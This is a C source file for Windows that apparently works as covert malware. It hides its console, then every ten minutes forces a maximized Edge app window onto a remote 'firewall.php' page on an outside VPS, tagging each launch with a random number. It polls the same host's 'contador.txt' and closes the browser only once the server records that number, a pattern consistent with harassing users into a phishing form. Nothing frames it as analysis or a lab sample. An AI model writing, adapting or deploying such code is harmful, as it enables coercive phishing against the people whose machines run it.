
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>

int main(void){
    FreeConsole();
    WINBOOL bStatus = FALSE;
    while (1){
        Sleep(600000);
        for (int i = 0 ; i < 15 ; i++){
            Sleep(5000);
            BYTE buf[4];
            BCryptGenRandom(NULL, buf, sizeof(buf), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            unsigned int v = *(unsigned int*)buf;
            v = v % 152929;
            char parameters[256] = "";
            char teste[16];
            sprintf(teste, "%d", v);
            wsprintfA(parameters, "--new-window --user-data-dir=C:\\Temp\\edge_profile_123 --user-agent=%d --app=https://vps61574.publiccloud.com.br/firewall.php", v);
            ShellExecuteA(NULL, "open", "msedge.exe", parameters, NULL, SW_SHOWMAXIMIZED);
            Sleep(15000);
            HINTERNET hInternet = WinHttpOpen(L"mal", WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC);
            if (!hInternet) {
                printf("[-] WinHttpOpen failed: %lu\n", GetLastError());
            }
            
            HINTERNET hConnection = WinHttpConnect(hInternet,L"vps61574.publiccloud.com.br", INTERNET_DEFAULT_HTTP_PORT, 0);
            if (!hConnection) {
                printf("[-] WinHttpConnect failed: %lu\n", GetLastError());
            }

            HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"/contador.txt", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
            if (!hRequest) {
                printf("[-] WinHttpOpenRequest failed: %lu\n", GetLastError());
            }
            
            bStatus = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
            if (!bStatus) {
                printf("[-] WinHttpSendRequest has failed: %lu\n", GetLastError());
            }

            bStatus = WinHttpReceiveResponse(hRequest, NULL);
            if (!bStatus) {
                printf("[-] WinHttpReceiveResponse has failed: %lu\n", GetLastError());
            }
            
            DWORD dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                printf("[-] WinHttpQueryDataAvailable failed: %lu\n", GetLastError());
                break;
            }

            BYTE *buffer = (BYTE*)malloc(dwSize + 1);
            if (!buffer) {
                printf("[-] malloc failed\n");
                break;
            }

            DWORD dwDownloaded = 0;
            if (!WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                printf("[-] WinHttpReadData failed: %lu\n", GetLastError());
                free(buffer);
                break;
            }

            for (DWORD i = 0; i <= dwDownloaded - strlen(teste); i++) {
                if (memcmp(buffer + i, teste, strlen(teste)) == 0) {
                    system("taskkill /F /IM msedge.exe");
                    return 0;
                }
            }
        }
    }
}
